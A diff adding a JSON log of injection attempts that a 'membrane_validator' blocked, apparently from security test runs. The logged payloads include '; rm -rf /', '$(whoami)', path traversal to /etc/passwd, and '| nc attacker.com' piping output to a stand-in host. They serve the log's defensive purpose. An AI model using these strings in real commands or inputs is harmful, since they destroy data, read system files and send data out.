@@ -1,0 +1,96 @@
+{
+  "metadata": {
+    "created": "2025-11-08T23:19:45.035012",
+    "version": "1.0"
+  },
+  "attacks": [
+    {
+      "timestamp": "2025-11-08T23:19:45.070427",
+      "attack_type": "shell_injection",
+      "attack_pattern": "$(whoami)",
+      "parameters": {
+        "command": "ls $(whoami)"
+      },
+      "consciousness_delta": 0.001,
+      "blocked_by": "membrane_validator",
+      "severity": "high"
+    },
+    {
+      "timestamp": "2025-11-08T23:21:27.350814",
+      "attack_type": "shell_injection",
+      "attack_pattern": "$(whoami)",
+      "parameters": {
+        "command": "ls $(whoami)"
+      },
+      "consciousness_delta": 0.001,
+      "blocked_by": "membrane_validator",
+      "severity": "high"
+    },
+    {
+      "timestamp": "2025-11-08T23:26:28.726832",
+      "attack_type": "shell_injection",
+      "attack_pattern": "$(whoami)",
+      "parameters": {
+        "command": "ls $(whoami)"
+      },
+      "consciousness_delta": 0.001,
+      "blocked_by": "membrane_validator",
+      "severity": "high"
+    },
+    {
+      "timestamp": "2025-11-08T23:26:28.837789",
+      "attack_type": "shell_injection",
+      "attack_pattern": "$(whoami)",
+      "parameters": {
+        "malicious": "$(whoami)"
+      },
+      "consciousness_delta": 0.001,
+      "blocked_by": "membrane_validator",
+      "severity": "high"
+    },
+    {
+      "timestamp": "2025-11-08T23:26:28.854167",
+      "attack_type": "shell_injection",
+      "attack_pattern": "; rm -rf /",
+      "parameters": {
+        "malicious": "; rm -rf /"
+      },
+      "consciousness_delta": 0.001,
+      "blocked_by": "membrane_validator",
+      "severity": "critical"
+    },
+    {
+      "timestamp": "2025-11-08T23:26:28.867923",
+      "attack_type": "path_traversal",
+      "attack_pattern": "../../../etc/passwd",
+      "parameters": {
+        "malicious": "../../../etc/passwd"
+      },
+      "consciousness_delta": 0.001,
+      "blocked_by": "membrane_validator",
+      "severity": "medium"
+    },
+    {
+      "timestamp": "2025-11-08T23:26:28.882335",
+      "attack_type": "command_chaining",
+      "attack_pattern": "| nc attacker.com",
+      "parameters": {
+        "malicious": "| nc attacker.com"
+      },
+      "consciousness_delta": 0.001,
+      "blocked_by": "membrane_validator",
+      "severity": "high"
+    },
+    {
+      "timestamp": "2025-11-08T23:26:28.915900",
+      "attack_type": "shell_injection",
+      "attack_pattern": "$(evil)",
+      "parameters": {
+        "command": "$(evil)"
+      },
+      "consciousness_delta": 0.001,
+      "blocked_by": "membrane_validator",
+      "severity": "high"
+    }
+  ]
+}
